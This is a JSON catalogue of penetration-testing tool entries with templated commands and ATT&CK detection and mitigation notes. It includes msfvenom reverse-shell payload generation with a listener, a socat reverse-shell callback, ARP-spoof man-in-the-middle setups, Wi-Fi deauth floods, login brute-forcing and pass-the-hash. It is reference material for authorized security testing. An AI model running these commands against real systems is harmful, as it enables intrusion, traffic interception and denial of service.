 {"id":"tool-fierce","updated":"2026-07","cat":"Tools","title":"fierce","desc":"DNS reconnaissance and subdomain scanner for locating non-contiguous IP space.","url":"https://www.kali.org/tools/fierce/","license":"open source","platforms":["linux"],"tags":["recon","dns","subdomain","tools"],"steps":[{"title":"Map a domain's subdomains","cmd":"fierce --domain {{DOMAIN:example.com}}","note":"Finds the name servers, tries a zone transfer, then brute-forces common subdomains and shows the surrounding IP space — good for spotting where a target's infrastructure lives."},{"title":"Use a custom subdomain list","cmd":"fierce --domain {{DOMAIN:example.com}} --subdomain-file {{WORDLIST:/usr/share/wordlists/dnsmap.txt}}","optional":true,"note":"Swap in your own name list to tailor the brute force to the organization (product names, regions, environments)."},{"title":"Widen the nearby-IP search","cmd":"fierce --domain {{DOMAIN:example.com}} --wide","optional":true,"note":"--wide scans the whole class-C block around each discovered host, catching related servers that share the same hosting range."}],"install":{"linux":"sudo apt install fierce"}},
 {"id":"tool-sublist3r","updated":"2026-07","cat":"Tools","title":"Sublist3r","desc":"Passive subdomain enumeration using public search engines and OSINT sources.","url":"https://www.kali.org/tools/sublist3r/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"steps":[{"title":"Enumerate subdomains passively","cmd":"sublist3r -d {{DOMAIN:example.com}}","note":"Queries search engines and public sources for subdomains without sending traffic to the target itself, so it's quiet and quick."},{"title":"Save the list for the next step","cmd":"sublist3r -d {{DOMAIN:example.com}} -o subs.txt","optional":true,"note":"-o writes the discovered names to a file — feed it into a prober or scanner (httpx, nmap) to see which subdomains are actually live."},{"title":"Check found subdomains for web ports","cmd":"sublist3r -d {{DOMAIN:example.com}} -p 80,443","optional":true,"note":"-p tests each subdomain for the given open ports; add -b to also brute-force names beyond what public sources returned."}],"install":{"linux":"sudo apt install sublist3r"}},
 {"id":"tool-recon-ng","updated":"2026-07","cat":"Tools","title":"recon-ng","desc":"Full-featured modular OSINT reconnaissance framework (Metasploit-style workflow).","url":"https://www.kali.org/tools/recon-ng/","license":"open source","platforms":["linux"],"tags":["recon","osint","tools"],"install":{"linux":"sudo apt install recon-ng"}},
 {"id":"tool-onesixtyone","updated":"2026-07","cat":"Tools","title":"onesixtyone","desc":"Fast SNMP scanner that brute-forces community strings across a range.","url":"https://www.kali.org/tools/onesixtyone/","license":"open source","platforms":["linux"],"tags":["recon","snmp","network","tools"],"install":{"linux":"sudo apt install onesixtyone"}},
 {"id":"tool-snmp-check","updated":"2026-07","cat":"Tools","title":"snmp-check","desc":"Enumerate a host over SNMP into a human-readable report (system, users, routes, processes).","url":"https://www.kali.org/tools/snmp-check/","license":"open source","platforms":["linux"],"tags":["recon","snmp","enumeration","tools"],"install":{"linux":"sudo apt install snmp-check"}},
 {"id":"tool-wfuzz","updated":"2026-07","cat":"Tools","title":"wfuzz","desc":"Web application fuzzer for content discovery, parameters, and injection points.","url":"https://www.kali.org/tools/wfuzz/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"steps":[{"title":"Discover content","cmd":"wfuzz -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} --hc 404 http://{{TARGET:10.0.0.5}}/FUZZ","note":"FUZZ marks the fuzzed position and --hc hides responses with that status code (here 404), so only existing paths are shown."},{"title":"Fuzz a parameter","cmd":"wfuzz -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} --hc 404 'http://{{TARGET:10.0.0.5}}/page?id=FUZZ'","note":"The same FUZZ keyword works in query strings, headers, and POST bodies, making wfuzz a general-purpose web fuzzer."},{"title":"Filter by response size","cmd":"wfuzz -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} --hw 0 http://{{TARGET:10.0.0.5}}/FUZZ","optional":true,"note":"--hw/--hl/--hh hide responses by word, line, or character count — the way to silence a page that returns the same size for everything."},{"title":"Brute-force a login form","cmd":"wfuzz -w {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -d 'user=admin&pass=FUZZ' --hc 200 http://{{TARGET:10.0.0.5}}/login","optional":true,"note":"-d supplies the POST body; adjust which status codes you hide or show to spot the response that signals a successful login."}],"install":{"linux":"sudo apt install wfuzz"}},
 {"id":"tool-commix","updated":"2026-07","cat":"Tools","title":"commix","desc":"Automated command-injection detection and exploitation tool.","url":"https://www.kali.org/tools/commix/","license":"open source","platforms":["linux"],"tags":["web","exploitation","tools"],"steps":[{"title":"Test a parameter for command injection","cmd":"commix -u 'http://{{TARGET:10.0.0.5}}/ping?host=127.0.0.1' --batch","note":"commix probes the host parameter for OS command injection; --batch takes defaults automatically. Because success means running commands on the server, use it only on authorized targets."},{"title":"Run a command through the injection","cmd":"commix -u 'http://{{TARGET:10.0.0.5}}/ping?host=127.0.0.1' --batch --os-cmd=id","note":"--os-cmd executes a single command (here id) to confirm code execution; omit it to drop into an interactive pseudo-shell."},{"title":"Test from a saved request","cmd":"commix -r request.txt --batch","optional":true,"note":"-r reads a full HTTP request so POST bodies, cookies, and headers are tested exactly as the browser sent them."}],"install":{"linux":"sudo apt install commix"}},
 {"id":"tool-mdk4","updated":"2026-07","cat":"Tools","title":"mdk4","desc":"802.11 stress-testing / attack tool (deauth, beacon flood, auth DoS).","url":"https://www.kali.org/tools/mdk4/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install mdk4"}},
 {"id":"tool-bettercap","updated":"2026-07","cat":"Tools","title":"bettercap","desc":"Swiss-army knife for network recon and MITM (ARP/DNS spoofing, sniffing, proxies).","url":"https://www.kali.org/tools/bettercap/","license":"open source","platforms":["linux"],"tags":["network","tools"],"steps":[{"title":"Start on an interface","cmd":"sudo bettercap -iface {{IFACE:eth0}}","note":"Drops you into bettercap's interactive session, where modules like net.probe, arp.spoof, and net.sniff are toggled on and off. Root is required for raw traffic."},{"title":"Discover hosts on the LAN","cmd":"net.probe on","note":"Actively probes the subnet so 'net.show' lists live hosts with their IPs and MACs — pick your target from there."},{"title":"ARP-spoof a target and sniff","cmd":"set arp.spoof.targets {{TARGET:10.0.0.5}}\narp.spoof on\nnet.sniff on","note":"Poisons ARP to place yourself between the target and the gateway, then captures its traffic. This is an active man-in-the-middle — run it only on a network you're authorized to test."},{"title":"Run a caplet or web UI","cmd":"sudo bettercap -iface {{IFACE:eth0}} -caplet http-ui","optional":true,"note":"Caplets script a sequence of commands; the http-ui caplet serves a browser dashboard so you can drive bettercap from a web interface."}],"install":{"linux":"sudo apt install bettercap"}},
 {"id":"tool-ettercap","updated":"2026-07","cat":"Tools","title":"ettercap","desc":"Suite for man-in-the-middle attacks on a LAN (ARP poisoning, sniffing, filtering).","url":"https://www.kali.org/tools/ettercap/","license":"open source","platforms":["linux"],"tags":["network","tools"],"steps":[{"title":"MITM between a host and the gateway","cmd":"sudo ettercap -T -i {{IFACE:eth0}} -M arp /{{TARGET:10.0.0.5}}// /{{GATEWAY:10.0.0.1}}//","note":"-T is the text UI and -M arp poisons ARP between the two targets so their traffic flows through you. Scope it to specific hosts — and only on authorized networks."},{"title":"Poison the whole subnet","cmd":"sudo ettercap -T -i {{IFACE:eth0}} -M arp // //","optional":true,"note":"Empty target specs poison every host on the segment. It's powerful but very noisy and disruptive, so prefer the two-host form above unless you truly need it."},{"title":"Modify traffic with a filter","cmd":"sudo ettercap -T -i {{IFACE:eth0}} -F filter.ef -M arp /{{TARGET:10.0.0.5}}// /{{GATEWAY:10.0.0.1}}//","optional":true,"note":"Compile a rule with 'etterfilter filter.ecf -o filter.ef', then -F loads it to rewrite packets on the fly (e.g. swap content or downgrade a header)."}],"install":{"linux":"sudo apt install ettercap-text-only"}},
 {"id":"tool-mitmproxy","updated":"2026-07","cat":"Tools","title":"mitmproxy","desc":"Interactive TLS-capable intercepting HTTP(S) proxy with a CLI and scripting API.","url":"https://www.kali.org/tools/mitmproxy/","license":"open source","platforms":["linux","macos"],"tags":["web","network","tools"],"steps":[{"title":"Start the interactive proxy","cmd":"mitmproxy -p {{PORT:8080}}","note":"Runs a terminal intercepting proxy on port 8080. Point the client at it and install mitmproxy's CA certificate so it can read HTTPS traffic."},{"title":"Capture headlessly to a file","cmd":"mitmdump -p {{PORT:8080}} -w flows.mitm","note":"mitmdump is the non-interactive version; -w records every flow to a file you can replay or inspect later."},{"title":"Use the web interface","cmd":"mitmweb -p {{PORT:8080}}","optional":true,"note":"mitmweb serves a browser UI for exploring intercepted flows, which many find easier than the terminal view."},{"title":"Load a Python addon","cmd":"mitmdump -s addon.py","optional":true,"note":"-s runs a script that can inspect or rewrite requests and responses programmatically — the way to automate custom interception logic."}],"install":{"linux":"sudo apt install mitmproxy","mac":"brew install mitmproxy"}},
 {"id":"tool-msfvenom","updated":"2026-07","cat":"Tools","title":"msfvenom","desc":"Metasploit payload generator and encoder (part of metasploit-framework).","url":"https://www.kali.org/tools/metasploit-framework/","license":"open source","platforms":["linux"],"tags":["exploitation","tools"],"steps":[{"title":"Build a Windows reverse shell","cmd":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST:10.0.0.2}} LPORT={{LPORT:4444}} -f exe -o shell.exe","note":"-p is the payload, -f the output format, -o the file. This produces an executable that calls back to you — only deliver it within an authorized engagement."},{"title":"Build a Linux payload","cmd":"msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST:10.0.0.2}} LPORT={{LPORT:4444}} -f elf -o shell.elf","note":"Swap the payload and format (elf, macho, etc.) to match the target OS. The LHOST/LPORT must match the listener that catches the connection."},{"title":"Catch the callback with a handler","cmd":"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST:10.0.0.2}}; set LPORT {{LPORT:4444}}; run'","note":"The multi/handler receives the shell when your payload runs. The PAYLOAD, LHOST, and LPORT must exactly match what you generated."},{"title":"List available payloads","cmd":"msfvenom --list payloads","optional":true,"note":"Also --list formats and --list encoders. Browse these to pick the right payload/format combo for an unusual target."},{"title":"Build a PHP web payload","cmd":"msfvenom -p php/meterpreter/reverse_tcp LHOST={{LHOST:10.0.0.2}} LPORT={{LPORT:4444}} -f raw -o shell.php","optional":true,"note":"A raw PHP payload suits a file-upload or LFI vulnerability on a web server. Same handler idea applies for the callback."}],"install":{"linux":"sudo apt install metasploit-framework"}},
 {"id":"tool-evil-winrm","updated":"2026-07","cat":"Tools","title":"evil-winrm","desc":"WinRM shell for Windows post-exploitation with upload/download and script loading.","url":"https://www.kali.org/tools/evil-winrm/","license":"open source","platforms":["linux"],"tags":["post-ex","remote","tools"],"steps":[{"title":"Get a PowerShell shell with creds","cmd":"evil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}}","note":"Opens an interactive PowerShell over WinRM (TCP 5985). The account must be in the Remote Management Users group or be a local admin."},{"title":"Authenticate with a hash (pass-the-hash)","cmd":"evil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:admin}} -H {{NTHASH:aad3b435b51404eeaad3b435b51404ee}}","note":"-H accepts an NT hash instead of a password, so a dumped hash alone is enough to log in when NTLM is allowed."},{"title":"Load scripts and move files","cmd":"evil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}} -s ./scripts/","optional":true,"note":"-s sets a local scripts directory to load PowerShell tools from. Inside the shell, 'upload' and 'download' transfer files and 'menu' lists loaded functions."}],"install":{"linux":"sudo apt install evil-winrm"}},
 {"id":"tool-proxychains","updated":"2026-07","cat":"Tools","title":"proxychains-ng","desc":"Force TCP connections from any tool through SOCKS/HTTP proxies (pivoting).","url":"https://www.kali.org/tools/proxychains-ng/","license":"open source","platforms":["linux"],"tags":["post-ex","network","tools"],"steps":[{"title":"Open a SOCKS proxy through a pivot","cmd":"ssh -D 1080 -N {{USER:user}}@{{PIVOT:10.0.0.5}}","note":"-D starts a dynamic SOCKS proxy on local port 1080 that tunnels through the pivot host. Add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf so proxychains uses it."},{"title":"Run a tool through the proxy","cmd":"proxychains nmap -sT -Pn {{TARGET:10.0.0.20}}","note":"proxychains forces the tool's TCP connections through the configured proxy. Use -sT (TCP connect) with Nmap — raw SYN scans can't be proxied."},{"title":"Proxy almost any TCP tool","cmd":"proxychains smbclient -L //{{TARGET:10.0.0.20}}","optional":true,"note":"Prefixing a command with proxychains lets browsers, SMB clients, and most TCP tools reach hosts on the internal network behind the pivot."}],"install":{"linux":"sudo apt install proxychains4"}},
 {"id":"tool-socat","updated":"2026-07","cat":"Tools","title":"socat","desc":"Multipurpose relay: bidirectional byte streams between sockets, files, pipes, PTYs.","url":"https://www.kali.org/tools/socat/","license":"open source","platforms":["linux","macos"],"tags":["network","file-transfer","tools"],"steps":[{"title":"Catch a fully-interactive shell","cmd":"socat FILE:$(tty),raw,echo=0 TCP-LISTEN:{{PORT:4444}}","note":"Unlike a bare nc listener, this gives a real PTY — working Ctrl-C, tab-completion, and full-screen tools. The target connects back with 'socat TCP:you:4444 EXEC:bash,pty,stderr'."},{"title":"Forward a port for pivoting","cmd":"socat TCP-LISTEN:{{LPORT:8080}},reuseaddr,fork TCP:{{TARGET:10.0.0.5}}:{{RPORT:80}}","note":"Relays a local port to a remote host:port, so you can reach a service that's only accessible from the machine running socat."},{"title":"Wrap the channel in TLS","cmd":"socat OPENSSL-LISTEN:{{PORT:4444}},cert=cert.pem,verify=0,fork -","optional":true,"note":"An OPENSSL endpoint encrypts the relay, which helps a callback blend in with normal TLS traffic. verify=0 skips cert validation for a quick lab setup."}],"install":{"linux":"sudo apt install socat","mac":"brew install socat"}},
 {"id":"tool-binwalk","updated":"2026-07","cat":"Tools","title":"binwalk","desc":"Firmware analysis: scan a binary for embedded files/filesystems and extract them.","url":"https://www.kali.org/tools/binwalk/","license":"open source","platforms":["linux","macos"],"tags":["forensics","tools"],"steps":[{"title":"Scan a binary for embedded content","cmd":"binwalk {{FILE:firmware.bin}}","note":"Signature-scans the file and lists embedded filesystems, archives, and files with their offsets — the first look inside a firmware image or unknown blob."},{"title":"Extract the detected files","cmd":"binwalk -e {{FILE:firmware.bin}}","note":"-e carves out everything it recognized into a _firmware.bin.extracted directory, so you can browse the unpacked contents."},{"title":"Recurse into nested layers","cmd":"binwalk -eM {{FILE:firmware.bin}}","optional":true,"note":"-M (Matryoshka) re-runs extraction on the files it just pulled out, peeling apart archives inside archives automatically."},{"title":"Check entropy for hidden data","cmd":"binwalk -E {{FILE:firmware.bin}}","optional":true,"note":"-E graphs entropy across the file; flat high-entropy regions usually mean compression or encryption worth investigating."}],"install":{"linux":"sudo apt install binwalk","mac":"brew install binwalk"}},
 {"id":"tool-foremost","updated":"2026-07","cat":"Tools","title":"foremost","desc":"Signature-based file carver that recovers files from disk images by header/footer.","url":"https://www.kali.org/tools/foremost/","license":"open source","platforms":["linux"],"tags":["forensics","recovery","tools"],"steps":[{"title":"Carve files from a disk image","cmd":"foremost -i {{IMAGE:disk.img}} -o output","note":"Recovers files purely from their header/footer signatures, so it works even on a corrupted or wiped filesystem. Results are sorted by type under output/."},{"title":"Carve only specific types","cmd":"foremost -t jpg,pdf,doc -i {{IMAGE:disk.img}} -o output","note":"-t limits recovery to the file types you name, which is much faster when you only care about, say, images or documents."},{"title":"Review the recovery audit","cmd":"cat output/audit.txt","optional":true,"note":"audit.txt logs every carved file with its offset and size — the record of what was recovered and from where."}],"install":{"linux":"sudo apt install foremost"}},
 {"id":"tool-steghide","updated":"2026-07","cat":"Tools","title":"steghide","desc":"Steganography tool to embed/extract data hidden in JPEG/BMP/WAV/AU files.","url":"https://www.kali.org/tools/steghide/","license":"open source","platforms":["linux"],"tags":["forensics","tools"],"steps":[{"title":"Hide a file inside a carrier","cmd":"steghide embed -cf {{CARRIER:photo.jpg}} -ef secret.txt","note":"Embeds secret.txt into a JPEG/BMP/WAV/AU carrier, prompting for a passphrase. The image looks unchanged but now carries the hidden data."},{"title":"Extract hidden data","cmd":"steghide extract -sf {{CARRIER:photo.jpg}}","note":"-sf points at the stego file; enter the passphrase and steghide writes out whatever was embedded. The standard first move when a CTF hands you a suspicious image."},{"title":"Check a carrier for embedded data","cmd":"steghide info {{CARRIER:photo.jpg}}","optional":true,"note":"Reports whether the file appears to contain embedded data and how much a given carrier could hold."}],"install":{"linux":"sudo apt install steghide"}},
 {"id":"tool-radare2","updated":"2026-07","cat":"Tools","title":"radare2","desc":"Open-source reverse-engineering framework: disassembler, debugger, hex editor.","url":"https://www.kali.org/tools/radare2/","license":"open source","platforms":["linux","macos"],"tags":["forensics","reference","tools"],"install":{"linux":"sudo apt install radare2","mac":"brew install radare2"}},
 {"id":"tool-gdb","updated":"2026-07","cat":"Tools","title":"gdb","desc":"The GNU debugger for dynamic analysis of native binaries (pair with pwndbg/gef).","url":"https://www.kali.org/tools/gdb/","license":"open source","platforms":["linux","macos"],"tags":["forensics","reference","tools"],"install":{"linux":"sudo apt install gdb"}},
 {"id":"tool-volatility3","updated":"2026-07","cat":"Tools","title":"Volatility 3","desc":"Advanced volatile-memory forensics framework for analyzing RAM dumps.","url":"https://www.kali.org/tools/volatility3/","license":"open source","platforms":["linux"],"tags":["forensics","memory","tools"],"steps":[{"title":"List processes in a memory dump","cmd":"vol -f {{DUMP:memory.raw}} windows.pslist","note":"Enumerates running processes from a RAM image. Volatility 3 auto-detects the OS build, so there's no profile to specify like in version 2."},{"title":"Find hidden or dead processes","cmd":"vol -f {{DUMP:memory.raw}} windows.psscan","note":"psscan carves process structures directly from memory, catching processes that have exited or been unlinked to hide from pslist — a classic malware tell."},{"title":"Recover network connections","cmd":"vol -f {{DUMP:memory.raw}} windows.netscan","note":"Rebuilds the sockets and connections that were active when the memory was captured, tying suspicious processes to remote hosts."},{"title":"Inspect a specific process","cmd":"vol -f {{DUMP:memory.raw}} windows.cmdline --pid {{PID:1234}}","optional":true,"note":"windows.cmdline shows how a process was launched; dumpfiles and memmap extract its artifacts and memory for deeper analysis."},{"title":"Analyze a Linux or macOS dump","cmd":"vol -f {{DUMP:memory.lime}} linux.pslist","optional":true,"note":"Swap the plugin prefix to linux. or mac. for non-Windows captures — the workflow is otherwise the same."}],"install":{"linux":"sudo apt install volatility3"}},
 {"id":"recon-netdiscover","level":"intermediate","requires":{"elevation":true,"tool":"netdiscover"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"ARP host discovery (netdiscover)","desc":"Find live hosts on the local L2 segment via ARP, without noisy port scans.","danger":"Authorized networks only; sends ARP traffic across the segment.","tags":["recon","network","discovery"],"attack":["T1018"],"detect":"Bursts of ARP requests sweeping sequential addresses from one host; watch switch/ARP tables.","mitigate":"Port security, DHCP snooping / dynamic ARP inspection, and NAC to flag rogue hosts.","code":{"linux":"sudo netdiscover -r {{CIDR:192.168.1.0/24}} -P   # -P one-shot table; omit for live view"},"related":["recon-arp-scan","recon-fping-sweep","recon-host-discovery"]},
 {"id":"recon-fping-sweep","level":"intermediate","requires":{"tool":"fping"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"ICMP host sweep (fping)","desc":"Enumerate live hosts across a range fast with parallel ICMP echo requests.","danger":"Authorized networks only.","tags":["recon","network","discovery"],"attack":["T1018"],"detect":"High-rate ICMP echo to sequential addresses from a single source.","mitigate":"Rate-limit/deny ICMP at boundaries where feasible; alert on sweep patterns.","code":{"linux":"fping -a -g {{CIDR:192.168.1.0/24}} 2>/dev/null   # -a alive only, -g generate range"},"related":["recon-netdiscover","recon-host-discovery"]},
 {"id":"recon-dnsrecon","level":"intermediate","requires":{"tool":"dnsrecon"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"DNS enumeration (dnsrecon)","desc":"Pull standard records, attempt zone transfer, and brute-force subdomains in one tool.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"AXFR attempts and high-volume DNS queries/NXDOMAIN from one resolver client.","mitigate":"Restrict zone transfers to secondaries; monitor authoritative logs for AXFR and brute patterns.","code":{"linux":"dnsrecon -d {{DOMAIN:example.com}} -t std          # std records\ndnsrecon -d {{DOMAIN:example.com}} -t axfr         # zone transfer\ndnsrecon -d {{DOMAIN:example.com}} -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt"},"related":["recon-dnsenum","recon-fierce","recon-dns-records","recon-dns-axfr"]},
 {"id":"recon-dnsenum","level":"intermediate","requires":{"tool":"dnsenum"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"DNS + subdomain brute (dnsenum)","desc":"Enumerate records, MX, name servers, attempt AXFR, and brute-force subdomains.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"AXFR attempts plus a burst of subdomain lookups from one client.","mitigate":"Lock down zone transfers; alert on DNS brute-force patterns.","code":{"linux":"dnsenum --enum {{DOMAIN:example.com}} -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},"related":["recon-dnsrecon","recon-sublist3r","recon-subdomains"]},
 {"id":"recon-fierce","level":"intermediate","requires":{"tool":"fierce"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"DNS recon scan (fierce)","desc":"Locate likely targets and non-contiguous IP space around a domain via DNS.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"Sequential DNS lookups probing common hostnames from one client.","mitigate":"Monitor authoritative DNS logs; restrict zone transfers.","code":{"linux":"fierce --domain {{DOMAIN:example.com}}"},"related":["recon-dnsrecon","recon-subdomains"]},
 {"id":"recon-sublist3r","level":"intermediate","requires":{"tool":"sublist3r"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"Passive subdomain enum (Sublist3r)","desc":"Gather subdomains from search engines and OSINT sources without touching the target.","danger":"Uses third-party OSINT sources; run only for authorized engagements.","tags":["recon","subdomain","osint"],"attack":["T1590.002"],"detect":"Largely passive (third-party sources); little direct target-side signal.","mitigate":"Minimize public exposure of hostnames; monitor certificate transparency for leaks.","code":{"linux":"sublist3r -d {{DOMAIN:example.com}} -o subs.txt"},"related":["recon-subdomains","recon-dnsenum","osint-cert-transparency"]},
 {"id":"recon-reconng","level":"intermediate","requires":{"tool":"recon-ng"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"OSINT recon framework (recon-ng)","desc":"Run modular OSINT recon (hosts, contacts, breaches) in a Metasploit-style console.","danger":"Queries third-party data sources; run only for authorized engagements.","tags":["recon","osint"],"attack":["T1596"],"detect":"Mostly passive third-party queries; minimal direct target signal.","mitigate":"Reduce public data exposure; monitor for credential/breach leaks tied to your domains.","code":{"linux":"recon-ng\n[recon-ng] marketplace install all\n[recon-ng] modules load recon/domains-hosts/hackertarget\n[recon-ng] options set SOURCE {{DOMAIN:example.com}}\n[recon-ng] run"},"related":["osint-theharvester","recon-sublist3r"]},
 {"id":"recon-onesixtyone","level":"intermediate","requires":{"tool":"onesixtyone"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"SNMP community scan (onesixtyone)","desc":"Brute-force SNMP community strings across a range to find manageable devices.","danger":"Authorized targets only.","tags":["recon","snmp","network"],"attack":["T1046"],"detect":"Many SNMP GET attempts with varied community strings from one source.","mitigate":"Disable SNMP or use SNMPv3 with auth/priv; ACL the management plane; drop default communities.","code":{"linux":"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{TARGET:10.0.0.0/24}}"},"related":["recon-snmpcheck","recon-snmp-walk"]},
 {"id":"recon-snmpcheck","level":"intermediate","requires":{"tool":"snmp-check"},"updated":"2026-07","cat":"Reconnaissance","team":"red","title":"SNMP enumeration (snmp-check)","desc":"Enumerate a device over SNMP into a readable report: system, users, routes, processes.","danger":"Authorized targets only.","tags":["recon","snmp","enumeration"],"attack":["T1046"],"detect":"Bulk SNMP walks pulling large OID subtrees from one client.","mitigate":"SNMPv3 only; restrict to management hosts; rotate and retire default communities.","code":{"linux":"snmp-check -c {{COMMUNITY:public}} {{TARGET:10.0.0.5}}"},"related":["recon-onesixtyone","recon-snmp-walk"]},
 {"id":"web-wfuzz","level":"intermediate","requires":{"tool":"wfuzz"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"Web fuzzing (wfuzz)","desc":"Fuzz paths, parameters, and values with wordlists; filter noise by code/size/words.","danger":"Authorized targets only.","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"High-volume requests iterating a wordlist against one host; spikes of 404/403.","mitigate":"Rate-limit, WAF, and monitor for content-discovery patterns.","code":{"linux":"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 https://{{TARGET:example.com}}/FUZZ"},"related":["web-gobuster-dir","web-ffuf-param","web-feroxbuster"]},
 {"id":"web-commix","level":"intermediate","requires":{"tool":"commix"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"Command-injection testing (commix)","desc":"Detect and exploit OS command injection in web parameters automatically.","danger":"Highly intrusive; runs commands on the target. Authorized testing only.","tags":["web","exploitation"],"attack":["T1190"],"detect":"Anomalous parameters containing shell metacharacters; unexpected process spawns from the web user.","mitigate":"Validate/allow-list input, avoid shell calls, run apps least-privileged, deploy a WAF.","code":{"linux":"commix --url \"https://{{TARGET:example.com}}/page?id=1\" --batch"},"related":["web-sqlmap","web-dalfox"]},
 {"id":"wifi-mdk4-deauth","level":"intermediate","requires":{"elevation":true,"tool":"mdk4"},"updated":"2026-07","cat":"Wireless Auditing","team":"red","title":"Wi-Fi deauth / beacon flood (mdk4)","desc":"Stress-test 802.11 with deauthentication or beacon-flood attacks from monitor mode.","danger":"Denial of service against wireless clients/APs. Authorized, isolated testing only.","tags":["wireless","network"],"attack":["T1498"],"detect":"Floods of deauth/disassoc or spurious beacons; IDS/WIPS alarms and client drop-offs.","mitigate":"Enable 802.11w (protected management frames); deploy a WIPS; investigate deauth spikes.","code":{"linux":"sudo mdk4 {{IFACE:wlan0mon}} d -c {{CHAN:6}}     # d = deauth flood\nsudo mdk4 {{IFACE:wlan0mon}} b -c {{CHAN:6}}     # b = beacon flood"},"related":["wifi-deauth-aireplay","wifi-deauth-detect"]},
 {"id":"net-bettercap-mitm","level":"beginner","requires":{"elevation":true,"tool":"bettercap"},"updated":"2026-07","cat":"Network","team":"purple","title":"ARP-spoof MITM (bettercap)","desc":"Position between a host and the gateway on a LAN to sniff and manipulate traffic.","danger":"Intercepts other users' traffic. Authorized, isolated testing only.","tags":["network"],"attack":["T1557.002"],"detect":"Duplicate/changing MAC for the gateway IP; gratuitous ARP; IDS ARP-spoof alerts.","mitigate":"Dynamic ARP inspection, DHCP snooping, static ARP for critical hosts, and 802.1X.","code":{"linux":"sudo bettercap -iface {{IFACE:eth0}}\n> set arp.spoof.targets {{TARGET:10.0.0.5}}\n> arp.spoof on\n> net.sniff on"},"related":["net-ettercap-mitm","net-mitmproxy"]},
 {"id":"net-ettercap-mitm","level":"beginner","requires":{"elevation":true,"tool":"ettercap"},"updated":"2026-07","cat":"Network","team":"purple","title":"ARP-poison MITM (ettercap)","desc":"Classic LAN man-in-the-middle via ARP poisoning with live sniffing.","danger":"Intercepts other users' traffic. Authorized, isolated testing only.","tags":["network"],"attack":["T1557.002"],"detect":"ARP cache anomalies (one MAC for many IPs); WIPS/NIDS ARP-poison signatures.","mitigate":"Dynamic ARP inspection, static ARP entries, network segmentation.","code":{"linux":"sudo ettercap -T -q -i {{IFACE:eth0}} -M arp /{{TARGET:10.0.0.5}}// /{{GATEWAY:10.0.0.1}}//"},"related":["net-bettercap-mitm","net-mitmproxy"]},
 {"id":"net-mitmproxy","level":"beginner","requires":{"tool":"mitmproxy"},"updated":"2026-07","cat":"Network","team":"purple","title":"Intercept HTTP(S) (mitmproxy)","desc":"Run a TLS-capable intercepting proxy to inspect and modify web traffic.","danger":"Requires installing a CA on the client; intercepts TLS. Authorized testing only.","tags":["web","network"],"attack":["T1557"],"detect":"Unexpected proxy CA in client trust store; traffic routed via a proxy host.","mitigate":"Certificate pinning, HSTS, and controls on client proxy/CA configuration.","code":{"linux":"mitmproxy --mode regular --listen-port {{PORT:8080}}   # then set client proxy to this host:8080"},"related":["net-bettercap-mitm"]},
 {"id":"net-socat-relay","level":"beginner","cat":"Network","title":"Relay & port-forward (socat)","desc":"Bidirectional stream relay: forward a local port to a remote service or bridge sockets.","danger":"Opens listening sockets/forwards traffic; use only where authorized.","tags":["network","file-transfer"],"code":{"linux":"# local port -> remote service (forward)\nsocat TCP-LISTEN:{{LPORT:8080}},fork,reuseaddr TCP:{{RHOST:10.0.0.5}}:{{RPORT:80}}\n# quick file receive\nsocat -u TCP-LISTEN:{{PORT:9000}},reuseaddr OPEN:incoming.bin,creat"},"related":["net-mitmproxy"]},
 {"id":"exp-msfvenom","level":"advanced","requires":{"tool":"msfvenom"},"updated":"2026-07","cat":"Exploitation Frameworks","team":"red","title":"Generate payloads (msfvenom)","desc":"Build and encode Metasploit payloads (reverse shells, stagers) for authorized testing.","danger":"Generates offensive payloads. Authorized engagements only; handle artifacts carefully.","tags":["exploitation"],"attack":["T1587.001"],"detect":"Known Metasploit payload signatures/shellcode; EDR/AV detections; unexpected outbound to LHOST.","mitigate":"EDR with behavioral detection, application allow-listing, egress filtering, and network segmentation.","code":{"linux":"# Windows reverse shell exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST:10.0.0.1}} LPORT={{LPORT:4444}} -f exe -o shell.exe\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST:10.0.0.1}} LPORT={{LPORT:4444}} -f elf -o shell.elf"},"related":["post-evil-winrm","post-remote-execution"]},
